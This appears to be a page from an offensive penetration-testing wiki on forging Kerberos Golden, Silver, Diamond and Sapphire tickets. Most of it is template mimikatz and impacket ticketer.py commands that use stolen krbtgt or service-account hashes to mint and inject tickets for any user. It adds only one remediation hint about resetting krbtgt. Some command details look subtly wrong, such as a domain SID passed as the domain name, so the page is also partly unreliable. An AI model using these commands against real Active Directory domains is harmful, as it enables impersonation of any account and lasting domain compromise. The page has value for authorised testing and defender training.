# Golden and Silver Tickets

With the krbtgt hash you can forge a TGT for any user — a Golden Ticket — that a DC will accept as genuine. A service account hash forges a service ticket (Silver); Diamond and Sapphire tickets refine the technique to better resemble legitimate tickets.

## Why It Works

Kerberos trusts anything encrypted with the krbtgt key, because only the KDC should know it. Stealing that key lets you mint tickets the domain cannot distinguish from real ones, for any user, valid until the key changes.

## Prerequisites

* The krbtgt hash (Golden) or a service account hash (Silver)
* The domain SID

## Execution

**Golden ticket**

* `ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
* `mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)

**Silver Ticket**

* `mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
* `ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

**Diamond ticket**

* `ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> -user-id <user_id> -groups '512,513,518,519,520' <anyuser>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

**Saphire Ticket**

* `ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> 'ignored'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

{% hint style="info" %}
A Golden Ticket survives password resets of the target user, but not a double reset of the krbtgt account — which is the standard remediation after a domain compromise.
{% endhint %}

## Related

* [NTDS Extraction & DCSync](file:///9685693/domain-dominance/ntds-and-dcsync.md) — obtaining the krbtgt hash
* [Directory Persistence](file:///9685693/domain-dominance/directory-persistence.md) — other ways to keep access
